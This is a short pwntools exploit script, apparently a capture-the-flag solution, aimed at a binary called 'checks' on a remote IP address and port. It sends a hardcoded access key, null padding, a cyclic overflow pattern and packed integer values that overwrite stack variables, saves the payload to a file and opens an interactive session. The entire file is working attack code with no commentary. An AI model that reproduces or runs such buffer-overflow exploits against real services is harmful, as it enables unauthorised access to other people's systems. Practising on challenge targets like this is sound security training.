from pwn import *
elf = ELF('./checks')

p = remote('115.127.114.85',8014)
#p = elf.process()
#context.terminal = ['tmux', 'splitw', '-h'] 
context.log_level = 'debug'

#addr = elf.symbols.move_me
#ret = ROP(elf).find_gadget(['ret'])[0]

p.recvuntil(b'Enter your access key: ')
payload = b"".join(
    [
        b"S3cR3t",
        b'\0'*2,
        cyclic(0x44),
        b'\x31\xd4\x00\x00',
        b'\x39\x30\x00\x00',
        b'\x39\x05\x00\x00',
        b'\xff\x00\x00\x00',
        p64(0x2a),
        b'\n',
    ]
)

#p.recvuntil('Enter your alias: \n')
#p.send(b'ic3')
f = open("demofile2.txt", "bw")
f.write(payload)
f.close()
p.send(payload)
p.interactive()